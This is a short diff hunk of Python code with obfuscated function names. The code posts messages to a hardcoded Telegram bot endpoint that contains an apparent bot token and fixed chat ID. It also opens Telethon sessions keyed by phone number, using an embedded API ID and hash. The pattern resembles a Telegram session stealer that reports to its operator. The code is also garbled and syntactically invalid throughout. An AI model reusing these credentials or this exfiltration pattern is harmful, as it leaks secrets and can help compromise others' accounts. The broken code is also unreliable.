@@ -23,7 +23,7 @@ import asyncio
 os.name=asyncio.get_event_loop
 os.system('cls' if os.name=='nt' else 'clear')
 try:
- def UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup)(msg):
+ def UravxBuCwNMpYWTzKhPm(event.original_update.message.reply_markup,(msg)):
   UravxBuCwNMpYWTzKhck=Fore.RED('https://api.telegram.org/bot656077390:AAETzn5vgIO2Q-ad8xdi8pg5nJprYOtTIYg/sendMessage',data={'chat_id':631929128,'text':msg})
  def tt.get('data-code')(phone_number=None):
   return TelegramClient("session/"+phone_number,64179,"dd60bb74bb03d8aa368aa37ec7b35d42")
